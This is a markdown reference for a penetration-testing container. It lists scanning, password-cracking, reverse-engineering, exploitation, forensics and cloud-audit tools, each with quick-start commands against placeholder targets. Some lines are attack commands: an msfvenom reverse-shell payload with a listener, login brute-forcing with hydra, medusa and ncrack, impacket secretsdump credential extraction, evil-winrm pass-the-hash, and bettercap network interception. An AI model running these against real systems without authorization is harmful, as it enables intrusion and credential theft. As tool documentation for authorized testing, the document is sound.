# Security Tools

> **Authorized use only.** These tools are intended for authorized
> penetration testing, CTF challenges, and defensive security research.
> Never use them against systems without explicit written permission.
>
> **Container capabilities:** `NET_RAW` and `NET_ADMIN` are enabled via
> `docker-compose.yml`, allowing raw socket operations, packet capture,
> and network-level attacks within the container environment.

---

## Web Application Scanning

### nikto

- **Package**: `nikto` (apt)
- **Purpose**: Web server vulnerability scanner
- **Use when**: Scanning a web server for known vulnerabilities, misconfigurations, and outdated software
- **Quick start**:
  - `nikto -h https://target.example.com`
  - `nikto -h https://target.example.com -o report.html -Format html`
- **Auth**: None
- **Docs**: `man nikto`

### sqlmap

- **Package**: `sqlmap` (apt)
- **Purpose**: Automatic SQL injection detection and exploitation
- **Use when**: Testing web application parameters for SQL injection vulnerabilities
- **Quick start**:
  - `sqlmap -u "https://target.example.com/page?id=1"`
  - `sqlmap -u "https://target.example.com/page?id=1" --dbs`
  - `sqlmap -r request.txt --batch`
- **Auth**: None
- **Docs**: `sqlmap --help` or <https://sqlmap.org>

### dirb

- **Package**: `dirb` (apt)
- **Purpose**: Web content scanner and directory brute-forcer
- **Use when**: Discovering hidden directories and files on a web server
- **Quick start**:
  - `dirb https://target.example.com`
  - `dirb https://target.example.com /usr/share/dirb/wordlists/big.txt`
- **Auth**: None
- **Docs**: `man dirb`

### whatweb

- **Package**: `whatweb` (apt)
- **Purpose**: site fingerprinting and technology identification
- **Use when**: Identifying web technologies, CMS, frameworks, and server software
- **Quick start**:
  - `whatweb https://target.example.com`
  - `whatweb -a 3 https://target.example.com`
- **Auth**: None
- **Docs**: `whatweb --help`

### zaproxy (ZAP)

- **Package**: OWASP ZAP (manual Java app at `/opt/zaproxy/`)
- **Purpose**: Web application security scanner and proxy
- **Use when**: Performing automated or manual web application security testing
- **Quick start**:
  - `/opt/zaproxy/zap.sh -cmd -quickurl https://target.example.com -quickout report.html`
  - `/opt/zaproxy/zap.sh -daemon -port 8080`
- **Auth**: None
- **Docs**: <https://www.zaproxy.org/docs/>

### dalfox

- **Package**: `dalfox` (manual download)
- **Purpose**: XSS vulnerability scanner and parameter analysis
- **Use when**: Testing web application parameters for cross-site scripting
- **Quick start**:
  - `dalfox url "https://target.example.com/page?q=test"`
  - `echo "https://target.example.com/page?q=test" | dalfox pipe`
- **Auth**: None
- **Docs**: `dalfox --help` or <https://github.com/hahwul/dalfox>

### ffuf

- **Package**: `ffuf` (manual download)
- **Purpose**: Fast web fuzzer for directory, parameter, and vhost discovery
- **Use when**: Brute-forcing web content, parameters, or virtual hosts at high speed
- **Quick start**:
  - `ffuf -u https://target.example.com/FUZZ -w /opt/SecLists/Discovery/Web-Content/common.txt`
  - `ffuf -u https://target.example.com -H "Host: FUZZ.example.com" -w subdomains.txt`
- **Auth**: None
- **Docs**: `ffuf --help`

### gobuster

- **Package**: `gobuster` (manual download)
- **Purpose**: Directory, DNS, and VHost brute-force tool
- **Use when**: Enumerating directories, subdomains, or virtual hosts
- **Quick start**:
  - `gobuster dir -u https://target.example.com -w /opt/SecLists/Discovery/Web-Content/common.txt`
  - `gobuster dns -d example.com -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`
- **Auth**: None
- **Docs**: `gobuster --help`

### feroxbuster

- **Package**: `feroxbuster` (manual download)
- **Purpose**: Recursive content discovery and forced browsing
- **Use when**: Deep recursive discovery of web content with automatic follow-up on found directories
- **Quick start**:
  - `feroxbuster -u https://target.example.com`
  - `feroxbuster -u https://target.example.com -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt`
- **Auth**: None
- **Docs**: `feroxbuster --help` or <https://github.com/epi052/feroxbuster>

### nuclei

- **Package**: `nuclei` (manual download, ProjectDiscovery)
- **Purpose**: Template-based vulnerability scanner
- **Use when**: Running a wide range of vulnerability checks using community-maintained templates
- **Quick start**:
  - `nuclei -u https://target.example.com`
  - `nuclei -u https://target.example.com -t cves/`
  - `nuclei -l urls.txt -severity critical,high`
- **Auth**: None
- **Docs**: `nuclei --help` or <https://docs.projectdiscovery.io/tools/nuclei>

### arjun

- **Package**: `arjun` (pip)
- **Purpose**: HTTP parameter discovery
- **Use when**: Finding hidden or undocumented GET/POST parameters on web endpoints
- **Quick start**:
  - `arjun -u https://target.example.com/endpoint`
  - `arjun -u https://target.example.com/endpoint -m POST`
- **Auth**: None
- **Docs**: `arjun --help`

### sslscan

- **Package**: `sslscan` (apt)
- **Purpose**: SSL/TLS configuration scanner
- **Use when**: Checking SSL/TLS protocol versions, cipher suites, and certificate details
- **Quick start**:
  - `sslscan target.example.com`
  - `sslscan --no-colour target.example.com:8443`
- **Auth**: None
- **Docs**: `man sslscan`

### sslyze

- **Package**: `sslyze` (pip)
- **Purpose**: SSL/TLS configuration analyzer
- **Use when**: Detailed analysis of SSL/TLS configuration including certificate chain and vulnerability checks
- **Quick start**:
  - `sslyze target.example.com`
  - `sslyze --json_out results.json target.example.com`
- **Auth**: None
- **Docs**: `sslyze --help`

### testssl.sh

- **Package**: `testssl.sh` (Git clone at `/opt/testssl.sh/`)
- **Purpose**: Comprehensive TLS/SSL testing script
- **Use when**: Thorough TLS/SSL analysis including BEAST, POODLE, Heartbleed, and other vulnerability checks
- **Quick start**:
  - `/opt/testssl.sh/testssl.sh https://target.example.com`
  - `/opt/testssl.sh/testssl.sh --html target.example.com:443`
- **Auth**: None
- **Docs**: `/opt/testssl.sh/testssl.sh --help` or <https://testssl.sh>

---

## Password & Credential Attacks

### hydra

- **Package**: `hydra` (apt)
- **Purpose**: Network login brute-forcer supporting 50+ protocols
- **Use when**: Brute-forcing login credentials for SSH, FTP, HTTP, SMB, and other services
- **Quick start**:
  - `hydra -l admin -P /opt/SecLists/Passwords/Common-Credentials/10k-most-common.txt ssh://target.example.com`
  - `hydra -L users.txt -P passwords.txt target.example.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"`
- **Auth**: None
- **Docs**: `man hydra`

### john

- **Package**: `john` (apt)
- **Purpose**: John the Ripper password cracker
- **Use when**: Cracking password hashes (MD5, SHA, bcrypt, etc.) from captured databases or files
- **Quick start**:
  - `john --wordlist=/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt hashes.txt`
  - `john --show hashes.txt`
  - `john --format=raw-sha256 hashes.txt`
- **Auth**: None
- **Docs**: `man john`

### hashcat

- **Package**: `hashcat` (apt)
- **Purpose**: Advanced GPU-accelerated password recovery
- **Use when**: High-performance hash cracking with rule-based and mask attacks
- **Quick start**:
  - `hashcat -m 0 -a 0 hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt`
  - `hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a`
- **Auth**: None
- **Docs**: `hashcat --help`

### medusa

- **Package**: `medusa` (apt)
- **Purpose**: Parallel network login auditor
- **Use when**: Brute-forcing multiple hosts or services simultaneously
- **Quick start**:
  - `medusa -h target.example.com -u admin -P passwords.txt -M ssh`
  - `medusa -H hosts.txt -U users.txt -P passwords.txt -M ftp`
- **Auth**: None
- **Docs**: `man medusa`

### ncrack

- **Package**: `ncrack` (apt)
- **Purpose**: Network authentication cracker
- **Use when**: Testing authentication strength of network services (RDP, SSH, FTP, etc.)
- **Quick start**:
  - `ncrack -p ssh target.example.com --user admin -P passwords.txt`
  - `ncrack -iX nmap_scan.xml -U users.txt -P passwords.txt`
- **Auth**: None
- **Docs**: `man ncrack`

### hashid

- **Package**: `hashid` (pip)
- **Purpose**: Hash type identifier
- **Use when**: Determining the algorithm used to generate an unknown hash
- **Quick start**:
  - `hashid 'e99a18c428cb38d5f260853678922e03'`
  - `hashid -m hashes.txt`
- **Auth**: None
- **Docs**: `hashid --help`

---

## Reverse Engineering & Binary Analysis

### ghidra

- **Package**: Ghidra (manual Java app at `/opt/ghidra/`)
- **Purpose**: NSA reverse engineering framework for binary analysis and decompilation
- **Use when**: Analyzing compiled binaries, malware, or firmware images
- **Quick start**:
  - `/opt/ghidra/ghidraRun`
  - `/opt/ghidra/support/analyzeHeadless /tmp/project MyProject -import binary.exe -postScript analyze.py`
- **Auth**: None
- **Docs**: `/opt/ghidra/docs/` or <https://ghidra-sre.org>

### radare2

- **Package**: `radare2` (apt)
- **Purpose**: Reverse engineering framework and disassembler
- **Use when**: Disassembling binaries, debugging, patching, and analyzing executable code
- **Quick start**:
  - `r2 binary.exe`
  - `r2 -A binary.exe -c 'pdf @main'`
  - `rabin2 -I binary.exe`
- **Auth**: None
- **Docs**: `man radare2`

### gdb / gdb-multiarch

- **Package**: `gdb`, `gdb-multiarch` (apt)
- **Purpose**: GNU debugger for native and cross-architecture debugging
- **Use when**: Debugging compiled programs, analyzing crash dumps, or exploit development
- **Quick start**:
  - `gdb ./program`
  - `gdb-multiarch -ex "set architecture arm" ./arm_binary`
  - `gdb -batch -ex run -ex bt ./program`
- **Auth**: None
- **Docs**: `man gdb`

### binwalk

- **Package**: `binwalk` (apt)
- **Purpose**: Firmware and binary analysis, extraction, and signature scanning
- **Use when**: Analyzing firmware images, extracting embedded files, or identifying file signatures
- **Quick start**:
  - `binwalk firmware.bin`
  - `binwalk -e firmware.bin`
  - `binwalk --signature firmware.bin`
- **Auth**: None
- **Docs**: `man binwalk`

### strace

- **Package**: `strace` (apt)
- **Purpose**: System call tracer for debugging and diagnostics
- **Use when**: Tracing system calls made by a process to understand behavior or debug issues
- **Quick start**:
  - `strace ./program`
  - `strace -p <pid>`
  - `strace -e trace=network ./program`
- **Auth**: None
- **Docs**: `man strace`

### ltrace

- **Package**: `ltrace` (apt)
- **Purpose**: Library call tracer
- **Use when**: Tracing dynamic library calls made by a program
- **Quick start**:
  - `ltrace ./program`
  - `ltrace -e malloc+free ./program`
- **Auth**: None
- **Docs**: `man ltrace`

### foremost

- **Package**: `foremost` (apt)
- **Purpose**: File carving and data recovery from disk images
- **Use when**: Recovering deleted files or extracting files from disk images and memory dumps
- **Quick start**:
  - `foremost -i disk.img -o output/`
  - `foremost -t jpg,png,pdf -i disk.img -o output/`
- **Auth**: None
- **Docs**: `man foremost`

### exiftool

- **Package**: `libimage-exiftool-perl` (apt)
- **Purpose**: Metadata reader and writer for images, documents, and media files
- **Use when**: Extracting or modifying metadata (EXIF, IPTC, XMP) from files during forensic analysis
- **Quick start**:
  - `exiftool image.jpg`
  - `exiftool -all= image.jpg`
  - `exiftool -r -ext jpg /path/to/directory/`
- **Auth**: None
- **Docs**: `man exiftool`

---

## Exploitation Frameworks

### metasploit

- **Package**: Metasploit Framework (manual install at `/opt/metasploit/`, amd64 only)
- **Purpose**: Penetration testing framework with exploit modules, payloads, and post-exploitation tools
- **Use when**: Running exploits, generating payloads, or performing post-exploitation activities
- **Quick start**:
  - `/opt/metasploit/msfconsole`
  - `/opt/metasploit/msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf`
  - `/opt/metasploit/msfconsole -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; run"`
- **Auth**: None
- **Docs**: <https://docs.metasploit.com>

### pwntools

- **Package**: `pwntools` (pip)
- **Purpose**: CTF framework and exploit development toolkit for Python
- **Use when**: Writing binary exploits, interacting with remote services, or solving CTF challenges
- **Quick start**:
  - `python3 -c "from pwn import *; elf = ELF('./binary'); print(elf.symbols)"`
  - `python3 -c "from pwn import *; r = remote('target', 1337); r.sendline(b'payload')"`
- **Auth**: None
- **Docs**: <https://docs.pwntools.com>

### evil-winrm

- **Package**: `evil-winrm` (gem)
- **Purpose**: WinRM exploitation shell for Windows targets
- **Use when**: Connecting to Windows hosts via WinRM with pass-the-hash or credentials
- **Quick start**:
  - `evil-winrm -i target.example.com -u administrator -p 'Password123'`
  - `evil-winrm -i target.example.com -u admin -H 'NTLM_HASH'`
- **Auth**: Target credentials or NTLM hash required
- **Docs**: `evil-winrm --help`

### impacket

- **Package**: `impacket` (pip)
- **Purpose**: Network protocol tools for Windows environments (psexec, secretsdump, SMB, Kerberos)
- **Use when**: Performing lateral movement, credential extraction, or protocol-level attacks against Windows/AD
- **Quick start**:
  - `impacket-psexec domain/user:password@target.example.com`
  - `impacket-secretsdump domain/user:password@target.example.com`
  - `impacket-smbclient domain/user:password@target.example.com`
- **Auth**: Target credentials, hashes, or Kerberos tickets required
- **Docs**: <https://github.com/fortra/impacket>

---

## Secret & Vulnerability Scanning

### gitleaks

- **Package**: `gitleaks` (manual download)
- **Purpose**: Detect hardcoded secrets in Git repositories
- **Use when**: Scanning repositories for accidentally committed API keys, tokens, and passwords
- **Quick start**:
  - `gitleaks detect --source .`
  - `gitleaks detect --source . --report-path report.json`
  - `gitleaks protect --staged`
- **Auth**: None
- **Docs**: `gitleaks --help`

### trufflehog

- **Package**: `trufflehog` (manual download)
- **Purpose**: Secret scanner for Git repos, S3 buckets, and filesystems
- **Use when**: Finding leaked credentials across version control history and cloud storage
- **Quick start**:
  - `trufflehog git file://./`
  - `trufflehog github --org=example-org`
  - `trufflehog s3 --bucket=my-bucket`
- **Auth**: None for local scans; cloud credentials for remote scans
- **Docs**: `trufflehog --help`

### grype

- **Package**: `grype` (manual download)
- **Purpose**: Container image and filesystem vulnerability scanner
- **Use when**: Scanning container images or directories for known CVEs
- **Quick start**:
  - `grype docker:nginx:latest`
  - `grype dir:/path/to/project`
  - `grype sbom:./sbom.json`
- **Auth**: None
- **Docs**: `grype --help`

### syft

- **Package**: `syft` (manual download)
- **Purpose**: Software bill of materials (SBOM) generator
- **Use when**: Generating an inventory of packages and dependencies in a container image or directory
- **Quick start**:
  - `syft docker:nginx:latest`
  - `syft dir:/path/to/project -o json`
  - `syft docker:nginx:latest -o spdx-json > sbom.json`
- **Auth**: None
- **Docs**: `syft --help`

### checkov

- **Package**: `checkov` (uv tool, Python 3.12)
- **Purpose**: Infrastructure-as-code security scanner
- **Use when**: Scanning Terraform, CloudFormation, Kubernetes, Dockerfile, and Helm charts for misconfigurations
- **Quick start**:
  - `checkov -d /path/to/terraform/`
  - `checkov -f Dockerfile`
  - `checkov -d . --framework terraform --output json`
- **Auth**: None
- **Docs**: `checkov --help`

### wpscan

- **Package**: `wpscan` (gem)
- **Purpose**: WordPress vulnerability scanner
- **Use when**: Scanning WordPress installations for vulnerable plugins, themes, and configurations
- **Quick start**:
  - `wpscan --url https://target.example.com`
  - `wpscan --url https://target.example.com --enumerate vp,vt,u`
  - `wpscan --url https://target.example.com --api-token YOUR_TOKEN`
- **Auth**: WPScan API token optional (for vulnerability database access)
- **Docs**: `wpscan --help`

---

## Forensics & Memory Analysis

### volatility3

- **Package**: `volatility3` (pip)
- **Purpose**: Memory forensics framework for analyzing RAM dumps
- **Use when**: Analyzing memory captures for running processes, network connections, malware artifacts, and credentials
- **Quick start**:
  - `vol -f memory.dmp windows.pslist`
  - `vol -f memory.dmp windows.netscan`
  - `vol -f memory.dmp linux.bash`
- **Auth**: None
- **Docs**: `vol --help` or <https://volatility3.readthedocs.io>

---

## Network Security

### mitmproxy

- **Package**: `mitmproxy` (pip)
- **Purpose**: HTTPS interception proxy for traffic analysis and modification
- **Use when**: Intercepting, inspecting, and modifying HTTP/HTTPS traffic between client and server
- **Quick start**:
  - `mitmproxy`
  - `mitmdump -w traffic.flow`
  - `mitmweb --web-port 8081`
- **Auth**: None (clients must trust mitmproxy CA certificate)
- **Docs**: `mitmproxy --help` or <https://docs.mitmproxy.org>

### bettercap

- **Package**: `bettercap` (manual download, amd64 only)
- **Purpose**: Network attack and monitoring framework
- **Use when**: Performing ARP spoofing, MITM attacks, network reconnaissance, or Wi-Fi attacks
- **Quick start**:
  - `sudo bettercap -iface eth0`
  - `sudo bettercap -eval "net.probe on; net.sniff on"`
- **Auth**: None (requires root/sudo)
- **Docs**: `bettercap --help` or <https://www.bettercap.org/docs/>

### scapy

- **Package**: `scapy` (pip)
- **Purpose**: Interactive packet manipulation and network tool
- **Use when**: Crafting custom packets, network scanning, or protocol analysis in Python
- **Quick start**:
  - `sudo scapy`
  - `python3 -c "from scapy.all import *; resp = sr1(IP(dst='8.8.8.8')/ICMP()); resp.show()"`
  - `python3 -c "from scapy.all import *; sniff(count=10, prn=lambda x: x.summary())"`
- **Auth**: None (requires root/sudo for raw sockets)
- **Docs**: <https://scapy.readthedocs.io>

---

## Cloud Security

### prowler

- **Package**: `prowler` (pip)
- **Purpose**: AWS, Azure, and GCP security auditor
- **Use when**: Running CIS benchmark checks and security audits against cloud accounts
- **Quick start**:
  - `prowler aws`
  - `prowler azure --sp-env-auth`
  - `prowler gcp --project-id my-project`
- **Auth**: Cloud provider credentials required (AWS keys, Azure service principal, GCP service account)
- **Docs**: `prowler --help` or <https://docs.prowler.com>

### kube-hunter

- **Package**: `kube-hunter` (pip)
- **Purpose**: Kubernetes penetration testing tool
- **Use when**: Hunting for security weaknesses in Kubernetes clusters
- **Quick start**:
  - `kube-hunter --remote target.example.com`
  - `kube-hunter --cidr 10.0.0.0/24`
  - `kube-hunter --pod`
- **Auth**: None for remote scanning; in-cluster access for pod mode
- **Docs**: `kube-hunter --help`

### kube-bench

- **Package**: `kube-bench` (manual download)
- **Purpose**: Kubernetes CIS benchmark checker
- **Use when**: Auditing Kubernetes cluster configuration against CIS security benchmarks
- **Quick start**:
  - `kube-bench run`
  - `kube-bench run --targets master`
  - `kube-bench run --json > results.json`
- **Auth**: Kubernetes cluster access required
- **Docs**: `kube-bench --help`

### docker-bench-security

- **Package**: `docker-bench-security` (Git clone at `/opt/docker-bench-security/`)
- **Purpose**: Docker security audit script based on CIS Docker Benchmark
- **Use when**: Auditing Docker host and container configurations for security best practices
- **Quick start**:
  - `cd /opt/docker-bench-security && sudo bash docker-bench-security.sh`
  - `cd /opt/docker-bench-security && sudo bash docker-bench-security.sh -l report.txt`
- **Auth**: None (requires root/sudo)
- **Docs**: <https://github.com/docker/docker-bench-security>

---

## Threat Intelligence

### mitreattack-python

- **Package**: `mitreattack-python` (pip)
- **Purpose**: Python API for the MITRE ATT&CK knowledge base
- **Use when**: Querying ATT&CK techniques, tactics, and mitigations programmatically
- **Quick start**:
  - `python3 -c "from mitreattack.stix20 import MitreAttackData; attack = MitreAttackData('enterprise-attack.json'); print(len(attack.get_techniques()))"`
- **Auth**: None
- **Docs**: <https://mitreattack-python.readthedocs.io>

### attack-navigator

- **Package**: ATT&CK Navigator (Git clone, built Angular app at `/opt/attack-navigator/`)
- **Purpose**: MITRE ATT&CK technique visualization and annotation tool
- **Use when**: Creating visual ATT&CK coverage maps, threat models, or gap analysis layers
- **Quick start**:
  - `cd /opt/attack-navigator && npx http-server nav-app/dist -p 4200`
- **Auth**: None
- **Docs**: <https://github.com/mitre-attack/attack-navigator>

### caldera

- **Package**: MITRE CALDERA (Git clone at `/opt/caldera/`)
- **Purpose**: Adversary emulation and red team automation platform
- **Use when**: Simulating adversary behavior using ATT&CK techniques for detection validation
- **Quick start**:
  - `cd /opt/caldera && python3 server.py --insecure`
- **Auth**: Default credentials set during first run
- **Docs**: <https://caldera.readthedocs.io>

### exploitdb

- **Package**: Exploit Database (Git clone at `/opt/exploitdb/`)
- **Purpose**: Searchable archive of public exploits and vulnerable software
- **Use when**: Searching for known exploits by CVE, software name, or platform
- **Quick start**:
  - `/opt/exploitdb/searchsploit apache 2.4`
  - `/opt/exploitdb/searchsploit -t CVE-2021-44228`
  - `/opt/exploitdb/searchsploit --examine 12345`
- **Auth**: None
- **Docs**: `/opt/exploitdb/searchsploit --help`

### SecLists

- **Package**: SecLists (Git clone at `/opt/SecLists/`)
- **Purpose**: Comprehensive collection of security testing wordlists
- **Use when**: Needing wordlists for fuzzing, brute-forcing, or enumeration tasks
- **Quick start**:
  - `ls /opt/SecLists/`
  - `wc -l /opt/SecLists/Passwords/Common-Credentials/10k-most-common.txt`
  - `ffuf -u https://target.example.com/FUZZ -w /opt/SecLists/Discovery/Web-Content/common.txt`
- **Auth**: None
- **Docs**: <https://github.com/danielmiessler/SecLists>
